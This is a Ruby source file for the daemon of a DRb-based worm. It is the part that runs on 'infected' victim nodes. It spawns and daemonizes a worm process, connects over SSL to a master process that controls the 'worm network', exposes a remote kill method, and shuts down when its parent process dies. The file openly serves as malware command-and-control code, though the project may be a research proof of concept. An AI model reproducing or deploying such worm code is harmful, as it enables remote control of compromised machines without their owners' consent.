##
# The daemon that runs on nodes infected with the worm.
#
# The daemon can either be spawned in the target context or started directly.
# The daemon is started with the URI of the local parent process (the process
# that spawned the daemon) and the URI of the master process (a
# DRb::Worm::Master).
#
# To spawn you need the directory containing the worm files on the victim:
#
#   DRb::Worm::Daemon.start worm_lib_dir, parent_uri, master_uri
#
# To run directly:
#
#   daemon = DRb::Worm::Daemon.new parent_uri, master_uri
#
#   daemon.run
#
# When the DRb server at +parent_uri+ shuts down the daemon will also shut
# down.

class DRb::Worm::Daemon

  ##
  # Starts the daemon using the worm files in +worm_lib_dir+.  See ::new for a
  # description of +parent_uri+ and +master_uri+.
  
  def self.start worm_lib_dir, parent_uri, master_uri
    dash_e = "DRb::Worm::Daemon.new(#{parent_uri.dump}, #{master_uri}).run"

    Process.spawn Gem.ruby,
                  '-I', worm_lib_dir,
                  '-r', 'drb/worm',
                  '-e', dash_e
  end

  ##
  # Creates a daemon that will shut down when +parent_uri+ shuts down.
  # +master_uri+ contains the master DRb process for the worm network.

  def initialize parent_uri, master_uri = nil
    @parent_uri = parent_uri
    @master_uri = master_uri
  end

  ##
  # Creates a SSL connection to the master process.

  def connect_to_master # :nodoc:
    return unless @master_uri

    tcp_server = DRb.start_service

    master = DRb::DRbObject.new_with_uri @master_uri

    c = DRb::Worm::Connection.new
    c.ca = master.ca

    DRb.primary_server = c.start_service

    DRb.remove_server tcp_server

    tcp_server.stop_service

    DRb.primary_server
  end

  ##
  # Kills the daemon.  This is provided to kill the worm process remotely.

  def die
    exit
  end

  ##
  # Starts the daemon

  def run
    Process.daemon

    watch_parent

    connect_to_master

    DRb.thread.join
  end

  ##
  # Watches the parent process and shuts down the local DRb server if the
  # parent process shuts down.

  def watch_parent # :nodoc:
    Thread.new do
      loop do
        begin
          DRb::DRbObject.new_with_uri(@parent_uri).method_missing :object_id
        rescue DRb::DRbConnError
          DRb.stop_service

          break
        end

        sleep 10
      end
    end
  end

end

